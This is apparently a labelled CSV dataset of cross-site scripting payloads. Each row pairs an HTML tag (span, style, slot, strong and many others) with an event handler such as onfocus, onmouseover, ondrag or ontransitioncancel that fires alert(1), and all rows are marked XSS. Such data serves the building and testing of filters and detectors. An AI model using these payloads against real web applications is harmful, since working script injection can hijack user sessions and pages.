payload,attack
"<select oncut=""alert(1)"" contenteditable>test</select>",XSS
"<select ondblclick=""alert(1)"">test</select>",XSS
<select onfocusout=alert(1) id=x></select><input autofocus>,XSS
"<select onkeydown=""alert(1)"" contenteditable>test</select>",XSS
"<select onkeypress=""alert(1)"" contenteditable>test</select>",XSS
"<select onkeyup=""alert(1)"" contenteditable>test</select>",XSS
"<select onmousedown=""alert(1)"">test</select>",XSS
"<select onmouseenter=""alert(1)"">test</select>",XSS
"<select onmouseleave=""alert(1)"">test</select>",XSS
"<select onmousemove=""alert(1)"">test</select>",XSS
"<select onmouseout=""alert(1)"">test</select>",XSS
"<select onmouseover=""alert(1)"">test</select>",XSS
"<select onmouseup=""alert(1)"">test</select>",XSS
"<select onpaste=""alert(1)"" contenteditable>test</select>",XSS
"<shadow draggable=""true"" ondrag=""alert(1)"">test</shadow>",XSS
"<shadow draggable=""true"" ondragend=""alert(1)"">test</shadow>",XSS
"<shadow draggable=""true"" ondragenter=""alert(1)"">test</shadow>",XSS
"<shadow draggable=""true"" ondragleave=""alert(1)"">test</shadow>",XSS
"<shadow draggable=""true"" ondragstart=""alert(1)"">test</shadow>",XSS
<shadow id=x tabindex=1 onactivate=alert(1)></shadow>,XSS
<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>,XSS
<shadow id=x tabindex=1 onbeforedeactivate=alert(1)></shadow><input autofocus>,XSS
<shadow id=x tabindex=1 ondeactivate=alert(1)></shadow><input id=y autofocus>,XSS
<shadow id=x tabindex=1 onfocus=alert(1)></shadow>,XSS
<shadow id=x tabindex=1 onfocusin=alert(1)></shadow>,XSS
"<shadow onbeforecopy=""alert(1)"" contenteditable>test</shadow>",XSS
"<shadow onbeforecut=""alert(1)"" contenteditable>test</shadow>",XSS
"<shadow onbeforepaste=""alert(1)"" contenteditable>test</shadow>",XSS
<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>,XSS
"<shadow onclick=""alert(1)"">test</shadow>",XSS
"<shadow oncontextmenu=""alert(1)"">test</shadow>",XSS
"<shadow oncopy=""alert(1)"" contenteditable>test</shadow>",XSS
"<shadow oncut=""alert(1)"" contenteditable>test</shadow>",XSS
"<shadow ondblclick=""alert(1)"">test</shadow>",XSS
<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>,XSS
"<shadow onkeydown=""alert(1)"" contenteditable>test</shadow>",XSS
"<shadow onkeypress=""alert(1)"" contenteditable>test</shadow>",XSS
"<shadow onkeyup=""alert(1)"" contenteditable>test</shadow>",XSS
"<shadow onmousedown=""alert(1)"">test</shadow>",XSS
"<shadow onmouseenter=""alert(1)"">test</shadow>",XSS
"<shadow onmouseleave=""alert(1)"">test</shadow>",XSS
"<shadow onmousemove=""alert(1)"">test</shadow>",XSS
"<shadow onmouseout=""alert(1)"">test</shadow>",XSS
"<shadow onmouseover=""alert(1)"">test</shadow>",XSS
"<shadow onmouseup=""alert(1)"">test</shadow>",XSS
"<shadow onpaste=""alert(1)"" contenteditable>test</shadow>",XSS
"<slot draggable=""true"" ondrag=""alert(1)"">test</slot>",XSS
"<slot draggable=""true"" ondragend=""alert(1)"">test</slot>",XSS
"<slot draggable=""true"" ondragenter=""alert(1)"">test</slot>",XSS
"<slot draggable=""true"" ondragleave=""alert(1)"">test</slot>",XSS
"<slot draggable=""true"" ondragstart=""alert(1)"">test</slot>",XSS
<slot id=x tabindex=1 onactivate=alert(1)></slot>,XSS
<slot id=x tabindex=1 onbeforeactivate=alert(1)></slot>,XSS
<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>,XSS
<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,XSS
<slot id=x tabindex=1 onfocus=alert(1)></slot>,XSS
<slot id=x tabindex=1 onfocusin=alert(1)></slot>,XSS
"<slot onbeforecopy=""alert(1)"" contenteditable>test</slot>",XSS
"<slot onbeforecut=""alert(1)"" contenteditable>test</slot>",XSS
"<slot onbeforepaste=""alert(1)"" contenteditable>test</slot>",XSS
<slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>,XSS
"<slot onclick=""alert(1)"">test</slot>",XSS
"<slot oncontextmenu=""alert(1)"">test</slot>",XSS
"<slot oncopy=""alert(1)"" contenteditable>test</slot>",XSS
"<slot oncut=""alert(1)"" contenteditable>test</slot>",XSS
"<slot ondblclick=""alert(1)"">test</slot>",XSS
<slot onfocusout=alert(1) tabindex=1 id=x></slot><input autofocus>,XSS
"<slot onkeydown=""alert(1)"" contenteditable>test</slot>",XSS
"<slot onkeypress=""alert(1)"" contenteditable>test</slot>",XSS
"<slot onkeyup=""alert(1)"" contenteditable>test</slot>",XSS
"<slot onmousedown=""alert(1)"">test</slot>",XSS
"<slot onmouseenter=""alert(1)"">test</slot>",XSS
"<slot onmouseleave=""alert(1)"">test</slot>",XSS
"<slot onmousemove=""alert(1)"">test</slot>",XSS
"<slot onmouseout=""alert(1)"">test</slot>",XSS
"<slot onmouseover=""alert(1)"">test</slot>",XSS
"<slot onmouseup=""alert(1)"">test</slot>",XSS
"<slot onpaste=""alert(1)"" contenteditable>test</slot>",XSS
"<small draggable=""true"" ondrag=""alert(1)"">test</small>",XSS
"<small draggable=""true"" ondragend=""alert(1)"">test</small>",XSS
"<small draggable=""true"" ondragenter=""alert(1)"">test</small>",XSS
"<small draggable=""true"" ondragleave=""alert(1)"">test</small>",XSS
"<small draggable=""true"" ondragstart=""alert(1)"">test</small>",XSS
<small id=x tabindex=1 onactivate=alert(1)></small>,XSS
<small id=x tabindex=1 onbeforeactivate=alert(1)></small>,XSS
<small id=x tabindex=1 onbeforedeactivate=alert(1)></small><input autofocus>,XSS
<small id=x tabindex=1 ondeactivate=alert(1)></small><input id=y autofocus>,XSS
<small id=x tabindex=1 onfocus=alert(1)></small>,XSS
<small id=x tabindex=1 onfocusin=alert(1)></small>,XSS
"<small onbeforecopy=""alert(1)"" contenteditable>test</small>",XSS
"<small onbeforecut=""alert(1)"" contenteditable>test</small>",XSS
"<small onbeforepaste=""alert(1)"" contenteditable>test</small>",XSS
<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,XSS
"<small onclick=""alert(1)"">test</small>",XSS
"<small oncontextmenu=""alert(1)"">test</small>",XSS
"<small oncopy=""alert(1)"" contenteditable>test</small>",XSS
"<small oncut=""alert(1)"" contenteditable>test</small>",XSS
"<small ondblclick=""alert(1)"">test</small>",XSS
<small onfocusout=alert(1) tabindex=1 id=x></small><input autofocus>,XSS
"<small onkeydown=""alert(1)"" contenteditable>test</small>",XSS
"<small onkeypress=""alert(1)"" contenteditable>test</small>",XSS
"<small onkeyup=""alert(1)"" contenteditable>test</small>",XSS
"<small onmousedown=""alert(1)"">test</small>",XSS
"<small onmouseenter=""alert(1)"">test</small>",XSS
"<small onmouseleave=""alert(1)"">test</small>",XSS
"<small onmousemove=""alert(1)"">test</small>",XSS
"<small onmouseout=""alert(1)"">test</small>",XSS
"<small onmouseover=""alert(1)"">test</small>",XSS
"<small onmouseup=""alert(1)"">test</small>",XSS
"<small onpaste=""alert(1)"" contenteditable>test</small>",XSS
"<source draggable=""true"" ondrag=""alert(1)"">test</source>",XSS
"<source draggable=""true"" ondragend=""alert(1)"">test</source>",XSS
"<source draggable=""true"" ondragenter=""alert(1)"">test</source>",XSS
"<source draggable=""true"" ondragleave=""alert(1)"">test</source>",XSS
"<source draggable=""true"" ondragstart=""alert(1)"">test</source>",XSS
<source id=x tabindex=1 onactivate=alert(1)></source>,XSS
<source id=x tabindex=1 onbeforeactivate=alert(1)></source>,XSS
<source id=x tabindex=1 onbeforedeactivate=alert(1)></source><input autofocus>,XSS
<source id=x tabindex=1 ondeactivate=alert(1)></source><input id=y autofocus>,XSS
<source id=x tabindex=1 onfocus=alert(1)></source>,XSS
<source id=x tabindex=1 onfocusin=alert(1)></source>,XSS
"<source onbeforecopy=""alert(1)"" contenteditable>test</source>",XSS
"<source onbeforecut=""alert(1)"" contenteditable>test</source>",XSS
"<source onbeforepaste=""alert(1)"" contenteditable>test</source>",XSS
<source onblur=alert(1) tabindex=1 id=x></source><input autofocus>,XSS
"<source onclick=""alert(1)"">test</source>",XSS
"<source oncontextmenu=""alert(1)"">test</source>",XSS
"<source oncopy=""alert(1)"" contenteditable>test</source>",XSS
"<source oncut=""alert(1)"" contenteditable>test</source>",XSS
"<source ondblclick=""alert(1)"">test</source>",XSS
<source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>,XSS
"<source onkeydown=""alert(1)"" contenteditable>test</source>",XSS
"<source onkeypress=""alert(1)"" contenteditable>test</source>",XSS
"<source onkeyup=""alert(1)"" contenteditable>test</source>",XSS
"<source onmousedown=""alert(1)"">test</source>",XSS
"<source onmouseenter=""alert(1)"">test</source>",XSS
"<source onmouseleave=""alert(1)"">test</source>",XSS
"<source onmousemove=""alert(1)"">test</source>",XSS
"<source onmouseout=""alert(1)"">test</source>",XSS
"<source onmouseover=""alert(1)"">test</source>",XSS
"<source onmouseup=""alert(1)"">test</source>",XSS
"<source onpaste=""alert(1)"" contenteditable>test</source>",XSS
"<spacer draggable=""true"" ondrag=""alert(1)"">test</spacer>",XSS
"<spacer draggable=""true"" ondragend=""alert(1)"">test</spacer>",XSS
"<spacer draggable=""true"" ondragenter=""alert(1)"">test</spacer>",XSS
"<spacer draggable=""true"" ondragleave=""alert(1)"">test</spacer>",XSS
"<spacer draggable=""true"" ondragstart=""alert(1)"">test</spacer>",XSS
<spacer id=x tabindex=1 onactivate=alert(1)></spacer>,XSS
<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>,XSS
<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>,XSS
<spacer id=x tabindex=1 ondeactivate=alert(1)></spacer><input id=y autofocus>,XSS
<spacer id=x tabindex=1 onfocus=alert(1)></spacer>,XSS
<spacer id=x tabindex=1 onfocusin=alert(1)></spacer>,XSS
"<spacer onbeforecopy=""alert(1)"" contenteditable>test</spacer>",XSS
"<spacer onbeforecut=""alert(1)"" contenteditable>test</spacer>",XSS
"<spacer onbeforepaste=""alert(1)"" contenteditable>test</spacer>",XSS
<spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>,XSS
"<spacer onclick=""alert(1)"">test</spacer>",XSS
"<spacer oncontextmenu=""alert(1)"">test</spacer>",XSS
"<spacer oncopy=""alert(1)"" contenteditable>test</spacer>",XSS
"<spacer oncut=""alert(1)"" contenteditable>test</spacer>",XSS
"<spacer ondblclick=""alert(1)"">test</spacer>",XSS
<spacer onfocusout=alert(1) tabindex=1 id=x></spacer><input autofocus>,XSS
"<spacer onkeydown=""alert(1)"" contenteditable>test</spacer>",XSS
"<spacer onkeypress=""alert(1)"" contenteditable>test</spacer>",XSS
"<spacer onkeyup=""alert(1)"" contenteditable>test</spacer>",XSS
"<spacer onmousedown=""alert(1)"">test</spacer>",XSS
"<spacer onmouseenter=""alert(1)"">test</spacer>",XSS
"<spacer onmouseleave=""alert(1)"">test</spacer>",XSS
"<spacer onmousemove=""alert(1)"">test</spacer>",XSS
"<spacer onmouseout=""alert(1)"">test</spacer>",XSS
"<spacer onmouseover=""alert(1)"">test</spacer>",XSS
"<spacer onmouseup=""alert(1)"">test</spacer>",XSS
"<spacer onpaste=""alert(1)"" contenteditable>test</spacer>",XSS
"<span draggable=""true"" ondrag=""alert(1)"">test</span>",XSS
"<span draggable=""true"" ondragend=""alert(1)"">test</span>",XSS
"<span draggable=""true"" ondragenter=""alert(1)"">test</span>",XSS
"<span draggable=""true"" ondragleave=""alert(1)"">test</span>",XSS
"<span draggable=""true"" ondragstart=""alert(1)"">test</span>",XSS
<span id=x tabindex=1 onactivate=alert(1)></span>,XSS
<span id=x tabindex=1 onbeforeactivate=alert(1)></span>,XSS
<span id=x tabindex=1 onbeforedeactivate=alert(1)></span><input autofocus>,XSS
<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>,XSS
<span id=x tabindex=1 onfocus=alert(1)></span>,XSS
<span id=x tabindex=1 onfocusin=alert(1)></span>,XSS
"<span onbeforecopy=""alert(1)"" contenteditable>test</span>",XSS
"<span onbeforecut=""alert(1)"" contenteditable>test</span>",XSS
"<span onbeforepaste=""alert(1)"" contenteditable>test</span>",XSS
<span onblur=alert(1) tabindex=1 id=x></span><input autofocus>,XSS
"<span onclick=""alert(1)"">test</span>",XSS
"<span oncontextmenu=""alert(1)"">test</span>",XSS
"<span oncopy=""alert(1)"" contenteditable>test</span>",XSS
"<span oncut=""alert(1)"" contenteditable>test</span>",XSS
"<span ondblclick=""alert(1)"">test</span>",XSS
<span onfocusout=alert(1) tabindex=1 id=x></span><input autofocus>,XSS
"<span onkeydown=""alert(1)"" contenteditable>test</span>",XSS
"<span onkeypress=""alert(1)"" contenteditable>test</span>",XSS
"<span onkeyup=""alert(1)"" contenteditable>test</span>",XSS
"<span onmousedown=""alert(1)"">test</span>",XSS
"<span onmouseenter=""alert(1)"">test</span>",XSS
"<span onmouseleave=""alert(1)"">test</span>",XSS
"<span onmousemove=""alert(1)"">test</span>",XSS
"<span onmouseout=""alert(1)"">test</span>",XSS
"<span onmouseover=""alert(1)"">test</span>",XSS
"<span onmouseup=""alert(1)"">test</span>",XSS
"<span onpaste=""alert(1)"" contenteditable>test</span>",XSS
"<strike draggable=""true"" ondrag=""alert(1)"">test</strike>",XSS
"<strike draggable=""true"" ondragend=""alert(1)"">test</strike>",XSS
"<strike draggable=""true"" ondragenter=""alert(1)"">test</strike>",XSS
"<strike draggable=""true"" ondragleave=""alert(1)"">test</strike>",XSS
"<strike draggable=""true"" ondragstart=""alert(1)"">test</strike>",XSS
<strike id=x tabindex=1 onactivate=alert(1)></strike>,XSS
<strike id=x tabindex=1 onbeforeactivate=alert(1)></strike>,XSS
<strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>,XSS
<strike id=x tabindex=1 ondeactivate=alert(1)></strike><input id=y autofocus>,XSS
<strike id=x tabindex=1 onfocus=alert(1)></strike>,XSS
<strike id=x tabindex=1 onfocusin=alert(1)></strike>,XSS
"<strike onbeforecopy=""alert(1)"" contenteditable>test</strike>",XSS
"<strike onbeforecut=""alert(1)"" contenteditable>test</strike>",XSS
"<strike onbeforepaste=""alert(1)"" contenteditable>test</strike>",XSS
<strike onblur=alert(1) tabindex=1 id=x></strike><input autofocus>,XSS
"<strike onclick=""alert(1)"">test</strike>",XSS
"<strike oncontextmenu=""alert(1)"">test</strike>",XSS
"<strike oncopy=""alert(1)"" contenteditable>test</strike>",XSS
"<strike oncut=""alert(1)"" contenteditable>test</strike>",XSS
"<strike ondblclick=""alert(1)"">test</strike>",XSS
<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>,XSS
"<strike onkeydown=""alert(1)"" contenteditable>test</strike>",XSS
"<strike onkeypress=""alert(1)"" contenteditable>test</strike>",XSS
"<strike onkeyup=""alert(1)"" contenteditable>test</strike>",XSS
"<strike onmousedown=""alert(1)"">test</strike>",XSS
"<strike onmouseenter=""alert(1)"">test</strike>",XSS
"<strike onmouseleave=""alert(1)"">test</strike>",XSS
"<strike onmousemove=""alert(1)"">test</strike>",XSS
"<strike onmouseout=""alert(1)"">test</strike>",XSS
"<strike onmouseover=""alert(1)"">test</strike>",XSS
"<strike onmouseup=""alert(1)"">test</strike>",XSS
"<strike onpaste=""alert(1)"" contenteditable>test</strike>",XSS
"<strong draggable=""true"" ondrag=""alert(1)"">test</strong>",XSS
"<strong draggable=""true"" ondragend=""alert(1)"">test</strong>",XSS
"<strong draggable=""true"" ondragenter=""alert(1)"">test</strong>",XSS
"<strong draggable=""true"" ondragleave=""alert(1)"">test</strong>",XSS
"<strong draggable=""true"" ondragstart=""alert(1)"">test</strong>",XSS
<strong id=x tabindex=1 onactivate=alert(1)></strong>,XSS
<strong id=x tabindex=1 onbeforeactivate=alert(1)></strong>,XSS
<strong id=x tabindex=1 onbeforedeactivate=alert(1)></strong><input autofocus>,XSS
<strong id=x tabindex=1 ondeactivate=alert(1)></strong><input id=y autofocus>,XSS
<strong id=x tabindex=1 onfocus=alert(1)></strong>,XSS
<strong id=x tabindex=1 onfocusin=alert(1)></strong>,XSS
"<strong onbeforecopy=""alert(1)"" contenteditable>test</strong>",XSS
"<strong onbeforecut=""alert(1)"" contenteditable>test</strong>",XSS
"<strong onbeforepaste=""alert(1)"" contenteditable>test</strong>",XSS
<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>,XSS
"<strong onclick=""alert(1)"">test</strong>",XSS
"<strong oncontextmenu=""alert(1)"">test</strong>",XSS
"<strong oncopy=""alert(1)"" contenteditable>test</strong>",XSS
"<strong oncut=""alert(1)"" contenteditable>test</strong>",XSS
"<strong ondblclick=""alert(1)"">test</strong>",XSS
<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>,XSS
"<strong onkeydown=""alert(1)"" contenteditable>test</strong>",XSS
"<strong onkeypress=""alert(1)"" contenteditable>test</strong>",XSS
"<strong onkeyup=""alert(1)"" contenteditable>test</strong>",XSS
"<strong onmousedown=""alert(1)"">test</strong>",XSS
"<strong onmouseenter=""alert(1)"">test</strong>",XSS
"<strong onmouseleave=""alert(1)"">test</strong>",XSS
"<strong onmousemove=""alert(1)"">test</strong>",XSS
"<strong onmouseout=""alert(1)"">test</strong>",XSS
"<strong onmouseover=""alert(1)"">test</strong>",XSS
"<strong onmouseup=""alert(1)"">test</strong>",XSS
"<strong onpaste=""alert(1)"" contenteditable>test</strong>",XSS
"<style draggable=""true"" ondrag=""alert(1)"">test</style>",XSS
"<style draggable=""true"" ondragend=""alert(1)"">test</style>",XSS
"<style draggable=""true"" ondragenter=""alert(1)"">test</style>",XSS
"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",XSS
"<style draggable=""true"" ondragstart=""alert(1)"">test</style>",XSS
<style id=x tabindex=1 onactivate=alert(1)></style>,XSS
<style id=x tabindex=1 onbeforeactivate=alert(1)></style>,XSS
<style id=x tabindex=1 onbeforedeactivate=alert(1)></style><input autofocus>,XSS
<style id=x tabindex=1 ondeactivate=alert(1)></style><input id=y autofocus>,XSS
<style id=x tabindex=1 onfocus=alert(1)></style>,XSS
<style id=x tabindex=1 onfocusin=alert(1)></style>,XSS
"<style onbeforecopy=""alert(1)"" contenteditable>test</style>",XSS
"<style onbeforecut=""alert(1)"" contenteditable>test</style>",XSS
"<style onbeforepaste=""alert(1)"" contenteditable>test</style>",XSS
<style onblur=alert(1) tabindex=1 id=x></style><input autofocus>,XSS
"<style onclick=""alert(1)"">test</style>",XSS
"<style oncontextmenu=""alert(1)"">test</style>",XSS
"<style oncopy=""alert(1)"" contenteditable>test</style>",XSS
"<style oncut=""alert(1)"" contenteditable>test</style>",XSS
"<style ondblclick=""alert(1)"">test</style>",XSS
<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>,XSS
"<style onkeydown=""alert(1)"" contenteditable>test</style>",XSS
"<style onkeypress=""alert(1)"" contenteditable>test</style>",XSS
"<style onkeyup=""alert(1)"" contenteditable>test</style>",XSS
<style onload=alert(1)></style>,XSS
"<style onmousedown=""alert(1)"">test</style>",XSS
"<style onmouseenter=""alert(1)"">test</style>",XSS
"<style onmouseleave=""alert(1)"">test</style>",XSS
"<style onmousemove=""alert(1)"">test</style>",XSS
"<style onmouseout=""alert(1)"">test</style>",XSS
"<style onmouseover=""alert(1)"">test</style>",XSS
"<style onmouseup=""alert(1)"">test</style>",XSS
"<style onpaste=""alert(1)"" contenteditable>test</style>",XSS
<style onreadystatechange=alert(1)></style>,XSS
"<style>:target {color: red;}</style><a id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></a>",XSS
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></abbr>",XSS
"<style>:target {color: red;}</style><acronym id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></acronym>",XSS
"<style>:target {color: red;}</style><address id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></address>",XSS
"<style>:target {color: red;}</style><applet id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></applet>",XSS
"<style>:target {color: red;}</style><area id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></area>",XSS
"<style>:target {color: red;}</style><article id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></article>",XSS
"<style>:target {color: red;}</style><aside id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></aside>",XSS
"<style>:target {color: red;}</style><audio id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></audio>",XSS
"<style>:target {color: red;}</style><b id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></b>",XSS
"<style>:target {color: red;}</style><base id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></base>",XSS
"<style>:target {color: red;}</style><basefont id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></basefont>",XSS
"<style>:target {color: red;}</style><bdi id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bdi>",XSS
"<style>:target {color: red;}</style><bdo id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bdo>",XSS
"<style>:target {color: red;}</style><bgsound id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bgsound>",XSS
"<style>:target {color: red;}</style><big id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></big>",XSS
"<style>:target {color: red;}</style><blink id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></blink>",XSS
"<style>:target {color: red;}</style><blockquote id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></blockquote>",XSS
"<style>:target {color: red;}</style><body id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></body>",XSS
"<style>:target {color: red;}</style><br id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></br>",XSS
"<style>:target {color: red;}</style><button id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></button>",XSS
"<style>:target {color: red;}</style><canvas id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></canvas>",XSS
"<style>:target {color: red;}</style><caption id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></caption>",XSS
"<style>:target {color: red;}</style><center id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></center>",XSS
"<style>:target {color: red;}</style><cite id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></cite>",XSS
"<style>:target {color: red;}</style><code id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></code>",XSS
"<style>:target {color: red;}</style><col id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></col>",XSS
"<style>:target {color: red;}</style><colgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></colgroup>",XSS
"<style>:target {color: red;}</style><command id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></command>",XSS
"<style>:target {color: red;}</style><content id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></content>",XSS
"<style>:target {color: red;}</style><data id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></data>",XSS
"<style>:target {color: red;}</style><datalist id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></datalist>",XSS
"<style>:target {color: red;}</style><dd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dd>",XSS
"<style>:target {color: red;}</style><del id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></del>",XSS
"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></details>",XSS
"<style>:target {color: red;}</style><dfn id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dfn>",XSS
"<style>:target {color: red;}</style><dialog id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dialog>",XSS
"<style>:target {color: red;}</style><dir id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dir>",XSS
"<style>:target {color: red;}</style><div id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></div>",XSS
"<style>:target {color: red;}</style><dl id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dl>",XSS
"<style>:target {color: red;}</style><dt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dt>",XSS
"<style>:target {color: red;}</style><element id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></element>",XSS
"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></em>",XSS
"<style>:target {color: red;}</style><embed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></embed>",XSS
"<style>:target {color: red;}</style><fieldset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></fieldset>",XSS
"<style>:target {color: red;}</style><figcaption id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></figcaption>",XSS
"<style>:target {color: red;}</style><figure id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></figure>",XSS
"<style>:target {color: red;}</style><font id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></font>",XSS
"<style>:target {color: red;}</style><footer id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></footer>",XSS
"<style>:target {color: red;}</style><form id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></form>",XSS
"<style>:target {color: red;}</style><frame id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frame>",XSS
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frameset>",XSS
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>",XSS
"<style>:target {color: red;}</style><head id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></head>",XSS
"<style>:target {color: red;}</style><header id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></header>",XSS
"<style>:target {color: red;}</style><hgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hgroup>",XSS
"<style>:target {color: red;}</style><hr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hr>",XSS
"<style>:target {color: red;}</style><html id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></html>",XSS
"<style>:target {color: red;}</style><i id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></i>",XSS
"<style>:target {color: red;}</style><iframe id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></iframe>",XSS
"<style>:target {color: red;}</style><image id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></image>",XSS
"<style>:target {color: red;}</style><img id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></img>",XSS
"<style>:target {color: red;}</style><input id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></input>",XSS
"<style>:target {color: red;}</style><ins id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ins>",XSS
"<style>:target {color: red;}</style><isindex id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></isindex>",XSS
"<style>:target {color: red;}</style><kbd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></kbd>",XSS
"<style>:target {color: red;}</style><keygen id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></keygen>",XSS
"<style>:target {color: red;}</style><label id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></label>",XSS
"<style>:target {color: red;}</style><legend id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></legend>",XSS
"<style>:target {color: red;}</style><li id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></li>",XSS
"<style>:target {color: red;}</style><link id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></link>",XSS
"<style>:target {color: red;}</style><listing id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></listing>",XSS
"<style>:target {color: red;}</style><main id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></main>",XSS
"<style>:target {color: red;}</style><map id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></map>",XSS
"<style>:target {color: red;}</style><mark id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></mark>",XSS
